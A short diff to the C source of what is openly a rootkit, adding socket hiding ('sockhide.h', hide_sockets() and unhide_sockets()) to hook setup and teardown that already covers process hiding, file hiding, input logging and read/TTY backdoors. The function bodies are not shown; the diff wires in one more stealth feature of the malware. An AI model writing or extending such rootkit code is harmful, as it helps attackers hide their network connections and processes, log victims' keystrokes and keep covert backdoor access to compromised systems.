@@ -19,6 +19,7 @@
 #include "backdoor.h"
 #include "pidhide.h"
 #include "openhide.h"
+#include "sockhide.h"
 #include "read.h"
 #include "inputlog.h"
 
@@ -83,6 +84,9 @@ init_hooks(void)
     if (rootkit.hiding_pids)
         hide_pids();
 
+    if (rootkit.hiding_sockets)
+        hide_sockets();
+
     if (rootkit.backdoor == BD_READ)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
@@ -108,6 +112,9 @@ remove_hooks(void)
         clear_hidden_pids();
         unhide_pids();
     }
+
+    if (rootkit.hiding_sockets)
+        unhide_sockets();
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
